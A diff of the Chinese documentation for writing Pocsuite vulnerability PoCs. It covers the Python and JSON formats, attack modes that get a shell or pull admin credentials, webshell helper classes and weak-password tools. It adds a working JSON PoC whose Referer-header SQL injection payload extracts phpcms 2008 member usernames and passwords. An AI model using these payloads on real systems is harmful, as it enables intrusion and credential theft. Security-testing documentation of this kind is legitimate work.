@@ -4,27 +4,48 @@
 | .-. | .-. | .--(  .-'|  ||  ,--'-.  .-| .-. : 
 | '-' ' '-' \ `--.-'  `'  ''  |  | |  | \   --. 
 |  |-' `---' `---`----' `----'`--' `--'  `----'  
-`--'                            http://sebug.net
+`--'                                   sebug.net
 
 ```
-POC编写说明
+PoC 编写说明文档
 ---
 ---
 
-# PoC py脚本编写步骤:
+*   [概述](#overview)
+*   [PoC python 脚本编写步骤](#pocpy)
+*   [PoC json 脚本编写步骤](#pocjson)
+*   [PoC 代码示例](#pocexample)
+    *   [PoC py代码示例](#pyexample)
+    *   [PoC json 代码示例](#jsonexample)
+*   [PoC 规范说明](#pocstandard)
+    *   [PoC 命名规范](#namedstandard)
+    *   [Result 说明](#resultstandard)
+    *   [漏洞类型规范](#vulcategory)
+    *   [Webshell 类](#webshell)
+    *   [弱口令相关](#weakpass)
+*   [PoC 编写注意事项](#attention)
+
+
+<h2 id="overview">概述</h2>
+ 本文档为 Pocsuite PoC 编写说明，Pocsuite 支持 python 和 json 两种格式的 PoC，本文档包含了两种格式的 PoC 编写的步骤以及相关 API 的一些说明。一个优秀的 PoC 离不开反复的调试、测试，在阅读本文档前，请先阅读 [Pocsuite 使用说明帮助文档](../README.md)。
+
+
+<h2 id="pocpy">PoC python脚本编写步骤:</h2>
 
 本小节介绍POC python脚本编写
 
-1. 首先新建一个.py文件,文件名应当符合 **poc命名规范** :
+Pocsuite 支持 Python 2.7，如若编写 Python 格式的 PoC，需要开发者具备一定的 Python 基础
+
+1. 首先新建一个.py文件,文件名应当符合 [PoC命名规范](#namedstandard)
 
 
 2. 编写POC实现类TestPOC,继承自POCBase类.
 
-    ```    
+    ```python
     #!/usr/bin/env python
     # -*- coding: utf-8 -*-
     
-    from pocsuite.net import req
+    from pocsuite.net import req   #用法和 requests 完全相同
     from pocsuite.poc import Output, POCBase
     from pocsuite.utils import register
     
@@ -32,17 +53,17 @@ POC编写说明
         ...
     
     ```
-3. 填写POC信息字段,**<font color=red>所有信息都要认真填写不然不会过审核的</font>**
+3. 填写 PoC 信息字段,**<font color=red>所有信息都要认真填写不然不会过审核的</font>**
    
-    ```
-    vulID = '1571'  # vul ID
+    ```python
+    vulID = '1571'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
     version = '1' #默认为1
-    author = 'zhengdt' # POC作者的大名
+    author = 'zhengdt' #  PoC作者的大名
     vulDate = '2014-10-16' #漏洞公开的时间,不知道就写今天
-    createDate = '2014-10-16'# 编写POC的日期
-    updateDate = '2014-10-16'#POC更新的时间,默认和编写时间一样
+    createDate = '2014-10-16'# 编写 PoC 的日期
+    updateDate = '2014-10-16'# PoC 更新的时间,默认和编写时间一样
     references = ['https://www.sektioneins.de/en/blog/14-10-15-drupal-sql-injection-vulnerability.html']# 漏洞地址来源,0day不用写
-    name = 'Drupal 7.x /includes/database/database.inc SQL注入漏洞 POC'# POC 名称
+    name = 'Drupal 7.x /includes/database/database.inc SQL注入漏洞 PoC'# PoC 名称
     appPowerLink = 'https://www.drupal.org/'# 漏洞厂商主页地址
     appName = 'Drupal'# 漏洞应用名称
     appVersion = '7.x'# 漏洞影响版本
@@ -51,12 +72,12 @@ POC编写说明
         Drupal 在处理 IN 语句时，展开数组时 key 带入 SQL 语句导致 SQL 注入，
         可以添加管理员、造成信息泄露。
     ''' # 漏洞简要描述
-    samples = []# 测试样列,就是用POC测试成功的网站
+    samples = []# 测试样列,就是用 PoC 测试成功的网站
     ```
 
-4. 编写POC检测代码
+4. 编写PoC检测代码
 
-    ```
+    ```python
     def _verify(self):
         output = Output(self)
         result = {} #result是返回结果
@@ -76,13 +97,15 @@ POC编写说明
        'SiteAttr':  {'Process':'xxx'}
     }
     ```
-    **result各字段意义请参见[附录](#result)**
-
+    **result各字段意义请参见[Result 说明](#resultstandard)**
+    
+    output 为 Pocsuite 标准输出API，如果要输出调用成功信息则使用 `output.success(result)`,如果要输出调用失败则 `output.fail('Error Message')`
+    
 5. 编写攻击模式:
 
-    攻击模式可以对目标进行getshell,查询管理员帐号密码等操作.定义它的方法与检测模式类似
+    攻击模式可以对目标进行 getshell,查询管理员帐号密码等操作.定义它的方法与检测模式类似
 
-    ```
+    ```python
     def _attack(self):
         output = Output(self)
         result = {}
@@ -91,9 +114,9 @@ POC编写说明
 
     和验证模式一样,攻击成功后需要把攻击得到结果赋值给result变量。
 
-    **注意:如果该POC没有攻击模式,可以在 \_attack()函数下加入一句 return self.\_verify() 这样你就无需再写 \_attack 函数了。**
+    **注意:如果该PoC没有攻击模式,可以在 \_attack()函数下加入一句 return self.\_verify() 这样你就无需再写 \_attack 函数了。**
     
-6. 注册POC实现类
+6. 注册PoC实现类
 
     在类的外部调用register()方法注册poc类
     ```
@@ -104,7 +127,9 @@ POC编写说明
     register(TestPOC)
     ```
 
-# PoC json脚本编写步骤:
+<h2 id="pocjson">PoC json脚本编写步骤:</h2>
+
+json 格式的 PoC 类似于完形填空,只需要填写相应的字段的值即可。**目前 json 支持的漏洞类型比较局限，如果想实现理复杂的业务逻辑，建议使用 Python**
 
 1. 首先新建一个.json文件,文件名应当符合 **poc命名规范** 
 
@@ -245,18 +270,16 @@ POC编写说明
     
     > "result": 为输出，其类型为 dict 
     
-    > "AdminInfo": 是管理员信息，此项为见 result 说明
+    > "AdminInfo": 是管理员信息，此项见 [Result 说明](#resultstandard)
     
     > "Password": 是result中 AdminInfo 中的字段，其值支持正则表达式，如果需要使用正则表达式来获取页面信息，则需要在表达式字符串前加`<regex>`
 
 
-附录:
-===
-----
+<h2 id="pocexample">PoC 代码示例</h2>
 
-#### POC py代码示例
+<h3 id="pyexample">PoC py代码示例</h3>
 
-**Drupal 7.x /includes/database/database.inc SQL注入漏洞 POC**:
+[Drupal 7.x /includes/database/database.inc SQL注入漏洞](http://www.sebug.net/vuldb/ssvid-88927) PoC:
 ```
 #!/usr/bin/env python
 # coding: utf-8
@@ -349,48 +372,44 @@ register(TestPOC)
 
 ```
 
-#### POC json代码示例
+<h3 id="jsonexample">PoC json代码示例</h3>
+[phpcms_2008_/ads/include/ads_place.class.php_sql注入漏洞](http://www.sebug.net/vuldb/ssvid-62274) PoC:
+
+由于json不支持注释,所以具体字段意义请参考上文，涉及到的靶场请自行根据Sebug漏洞详情搭建。
+
 ```
 {
     "pocInfo": {
-        "vulID": "poc-2015-0107",
-        "name": "Openssl 1.0.1 内存读取 信息泄露漏洞",
+        "vulID": "62274",
+        "version":"1",
+        "vulDate":"2011-11-21",
+        "createDate":"2015-09-15",
+        "updateDate":"2015-09-15",
+        "name": "phpcms_2008_ads_place.class.php_sql-inj",
         "protocol": "http",
-        "author": "test",
-        "references": ["http://drops.wooyun.org/papers/1381"],
-        "appName": "OpenSSL",
-        "appVersion" : "1.0.1~1.0.1f, 1.0.2-beta, 1.0.2-beta1",
-        "vulType": "Information Disclosure",
-        "desc" :"OpenSSL是一个强大的安全套接字层密码库。这次漏洞被称为OpenSSL“心脏出血”漏洞，这是关于 OpenSSL 的信息泄漏漏洞导致的安全问题。它使攻击者能够从内存中读取最多64 KB的数据。安全人员表示：无需任何特权信息或身份验证，我们就可以从我们自己的（测试机上）偷来X.509证书的私钥、用户名与密码、聊天工具的消息、电子邮件以及重要的商业文档和通信等数据.",
-        "samples": ["http://www.baidu.com", "http://www.qq.com"]
+        "vulType": "SQL Injection",
+        "author": "Medici.Yan",
+        "references": ["http://www.sebug.net/vuldb/ssvid-62274"],
+        "appName": "phpcms",
+        "appVersion" : "2008",
+        "appPowerLink":"http://www.phpcms.cn",
+        "desc" :"phpcms 2008 中广告模块，存在参数过滤不严，导致了sql注入漏洞，如果对方服务器开启了错误显示，可直接利用，如果关闭了错误显示，可以采用基于时间和错误的盲注",
+        "samples": ["http://127.0.0.1"]
     },
 
     "pocExecute":{
         "verify": [
             {
-                "step": "1",
+                "step": "0",
                 "method": "get",
-                "vulPath": "/api.php",
-                "params": "test=123&shit=1234",
+                "vulPath": "/data/js.php",
+                "params": "id=1",
                 "necessary": "",
-                "headers": {"cookie": "123"},
-                "status":"300",
+                "headers": {"Referer":"1', (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),char(45,45,45),(SELECT md5(1)))a from information_schema.tables group by a)b), '0')#"},
+                "status": "200",
                 "match": {
-                    "regex": ["baidu"],
-                    "time": "time"
-                }
-            },
-            {
-                "step": "2",
-                "method": "get",
-                "vulPath": "/api.php",
-                "params": "test=sebug",
-                "necessary": "",
-                "headers": "",
-                "status":"200",
-                "match":{
-                    "regex": [],
-                    "time": "0.01"
+                    "regex": ["c4ca4238a0b923820dcc509a6f75849b"],
+                    "time":""
                 }
             }
         ],
@@ -398,19 +417,20 @@ register(TestPOC)
             {
                 "step": "0",
                 "method": "get",
-                "vulPath": "/api.php",
-                "params": "test=attack",
+                "vulPath": "/data/js.php",
+                "params": "id=1",
                 "necessary": "",
-                "headers": "",
-                "status":"300",
+                "headers": {"Referer":"1', (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),char(45,45),(SELECT concat(username,char(45,45,45),password,char(45,45)) from phpcms_member limit 1))a from information_schema.tables group by a)b), '0')#"},
+                "status":"200",                
                 "match":{
-                    "regex": [],
+                    "regex": ["Duplicate"],
                     "time": ""
                 },
-                "result“:{
-                  "AdminInfo":{
-                    "Password": "<regex>www(.+)com"
-                  }
+                "result":{
+                    "AdminInfo":{
+                        "Username":"<regex>--(.+)---",
+                        "Password": "<regex>---(.+)--"
+                    }
                 }
             }
         ]
@@ -419,17 +439,38 @@ register(TestPOC)
 
 ```
 
-#### poc命名规范
+使用json PoC 检测目标：
 
-    PoC 命名分成3个部分组成漏洞应用名_版本号_漏洞类型名称 然后把文件名种的所有字母改成成小写,所有的符号改成_.
-    文件名不能有特殊字符和大写字母 最后出来的文件名应该像这样 
-    ```
+![verify](./images/poc_json_verify.png)
+
+使用json PoC 攻击目标：
+![attack](./images/poc_json_attack.png)
+
+
+<h2 id="pocstandard">PoC 规范说明</h2>
+
+<h3 id="namedstandard">PoC 命名规范</h3>
+
+PoC 命名分成3个部分组成漏洞应用名_版本号_漏洞类型名称 然后把文件名种的所有字母改成成小写,所有的符号改成_.
+文件名不能有特殊字符和大写字母 最后出来的文件名应该像这样 
+
+```
     _1847_seeyon_3_1_login_info_disclosure.py
-    ```
+```
 
+<h3 id="resultstandard">Result 说明</h3>
 
-#### result各key对应的含义:
+result 为 PoC 返回的数据类型，具体字段含义详细见 [Result 具体字段说明](#result)，例如:
+```python
+  #返回数据库管理员密码
+  result['DBInfo']['Password']='xxxxx'
+  #返回 Webshell 地址
+  result['ShellInfo']['URL'] = 'xxxxx'
+  #返回网站管理员用户名
+  result['AdminInfo']['Username']='xxxxx'
+```
 
+<strong id="result">Result 具体字段说明</strong>：
 ```
 result：[
     {  name: 'DBInfo'，        value：'数据库内容' }，
@@ -475,7 +516,7 @@ result：[
 ```
 
 
-#### 漏洞类型规范
+<h3 id="vulcategory">漏洞类型规范</h3>
 
 <table border=1>
     <tr><td>英文名称</td><td>中文名称</td><td>缩写</td></tr>
@@ -538,8 +579,8 @@ result：[
 也可以参见[漏洞类型规范](http://sebug.net/category)
 
 
-#### WebShell类
-pocsuite提供两个类来快速生成WebShell。具体代码见：lib/utils/webshell.py
+<h3 id="webshell">WebShell类</h3>
+Pocsuite提供两个类来快速生成WebShell。具体代码见：lib/utils/webshell.py
 
 WebShell类：
 
@@ -577,7 +618,7 @@ from lib.utils.webshell import PhpShell
 如果需要自定义WebShell，可以继承WebShell类。
 如果需要自定义VerifyShell,可以继承VerifyShell类。
 
-#### 弱口令相关
+<h3 id="weakpass">弱口令相关</h3>
 
 引入API:
 ```
@@ -596,7 +637,7 @@ genPassword(length=8, chars=string.letters+string.digits)
 相关的密码文件在 pocsuite/data 目录下，如果需要修改字典位置，可以修改paths.WEAK_PASS属性和paths.LARGE_WEAK_PASS 属性值。
 
 
-#### PoC 编写注意事项
+<h2 id="attention">PoC 编写注意事项</h2>
 1. 检测模式为了防止误报的产生,我们一般使用的让页面输出一个自定义的字符串。
 
     比如:
